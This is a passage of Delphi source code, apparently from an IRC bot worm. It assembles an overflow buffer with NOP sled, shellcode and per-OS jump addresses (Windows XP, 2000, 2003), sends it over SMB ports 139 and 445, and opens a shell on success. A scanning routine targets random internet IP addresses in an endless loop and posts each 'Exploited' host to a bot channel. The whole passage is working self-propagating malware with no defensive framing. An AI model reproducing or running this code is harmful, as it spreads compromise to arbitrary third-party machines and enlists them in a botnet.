       fillchar(screq2k ,(BUFSIZE+sizeof(req7)+1500)*2, $31);
       fillchar(screq2k2,(BUFSIZE+sizeof(req7)+1500)*2, $31);
     End Else
     Begin
       Strasm := #$66#$81#$EC#$1C#$07#$FF#$E4;
       fillchar(strbuffer, bufsize, nop);
       memcpy(strbuffer[160], sc, length(sc));
       memcpy(strbuffer[1980], strasm, length(strasm));
       Case Target Of
         0: JMPADD := WINXPJMP;
         1: JMPADD := WIN2kJMP;
         2: JMPADD := WIN2SJMP;
       End;
       memcpy(strbuffer[1964], JMPADD, 4);
     End;

     FillChar(Screq, BUFSIZE+SizeOf(Req7)+1500, $31);

     If Send(Sock, Req4u, Smblen+4, 0) = -1 Then Exit;
   //  L := Recv(Sock, RecvBuf, 1600, 0);

     If Send(Sock, Req5 , SizeOf(Req5)-1, 0) = -1 Then Exit;
   //  L := Recv(Sock, RecvBuf, 1600, 0);

     If Send(Sock, Req6 , SizeOf(Req6)-1, 0) = -1 Then Exit;
   //  L := Recv(Sock, RecvBuf, 1600, 0);

     If Which = 1 Then
     Begin
       memcpy(screq2k, req8, sizeof(req8)-1);
       memcpy(screq2k[sizeof(req8)-1], sendbuf, (LEN+1)*2);

       memcpy(screq2k2, req9, sizeof(req9)-1);
       memcpy(screq2k2[sizeof(req9)-1], sendbuf[4348-sizeof(req8)+1], (len+1)*2-4348);

       memcpy(screq2k2[sizeof(req9)-1+(LEN+1)*2-4348-sizeof(req8)+1+206], Shit3, SizeOf(Shit3)-1);

       If Send(Sock, Screq2k, 4348, 0) = -1 Then Exit;
   //    L := Recv(Sock, RecvBuf, 1600, 0);

       If Send(Sock, Screq2k2, 4060, 0) = -1 Then Exit;
     End Else
     Begin
       memcpy(screq, req7, sizeof(req7)-1);
       memcpy(screq[sizeof(req7)-1], strbuffer[0], BUFSIZE);
       memcpy(screq[sizeof(req7)-1+BUFSIZE], shit1, 9*16);

       screq[sizeof(req7)-1+BUFSIZE+1500-304-1] := #0;
       if send(Sock, Screq, BUFSIZE+SizeOf(Req7)-1+1500-304, 0) = -1 Then Exit;
     End;
     Sleep(300);

     If ConnectShell(IP) Then Result := True;
   End;

   function StrtoInt(const S: string): integer; var
   E: integer; begin Val(S, Result, E); end;

   function InttoStr(const Value: integer): string;
   var S: string[11]; begin Str(Value, S); Result := S; end;

   Procedure SendData(Text: String);
   Begin
     Send(BotSock, Text[1], Length(Text), 0);
   End;

   Procedure Lsass;
   Var
     Sock: TSocket;
     Addr: TSockAddrIn;
     Wsa : TWSAData;
     IP  : String;
   Begin
     IP := IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1);
     WSAStartUp(MakeWord(2,2), WSA);
       Sock := Socket(Af_inet, sock_Stream, 0);
       addr.sin_family := af_inet;
       Randomize;
       addr.sin_port := htons(139);
       Case Random(2) Of
         0:addr.sin_port := htons(139);
         1:addr.sin_port := htons(445);
       End;
       addr.sin_addr.S_addr := inet_addr(pchar(ip));
       if connect(sock, addr, sizeof(addr)) > 0 Then
       Begin
         If Exploit2(IP, Sock, 0, 0) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         If Exploit2(IP, Sock, 0, 1) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         If Exploit2(IP, Sock, 0, 2) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         If Exploit2(IP, Sock, 1, 0) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         If Exploit2(IP, Sock, 1, 1) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         If Exploit2(IP, Sock, 1, 2) Then SendData('PRIVMSG '+BotChan+' :[LSASS]Exploited '+IP+#10);
         CloseSocket(Sock);
       End;
     WSACleanUp;
   End;

   Procedure DoLsass;
   Begin
     Repeat
       Lsass;
     Until 1 = 2;
   End;

   end.
